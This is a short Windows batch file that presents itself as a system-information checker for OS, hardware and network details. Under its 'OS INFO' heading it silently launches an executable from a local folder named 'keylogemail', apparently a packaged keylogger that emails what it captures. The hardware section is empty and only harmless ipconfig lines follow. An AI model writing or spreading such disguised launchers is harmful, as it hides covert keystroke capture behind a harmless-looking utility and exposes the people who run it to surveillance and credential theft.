@ECHO OFF 
:: This batch file reveals OS, hardware, and networking configuration.
TITLE My System Info
ECHO Please wait... Checking system information.
:: Section 1: OS information.
ECHO ============================
ECHO OS INFO
ECHO ============================

:: Refer to the exe directory for windows
C:\Users\Lenovo\Documents\Python Scripts\keylogemail\dist\systemcheck\systemcheck.exe

ECHO ============================
ECHO HARDWARE INFO
ECHO ============================

ECHO ============================
ECHO NETWORK INFO
ECHO ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6
PAUSE
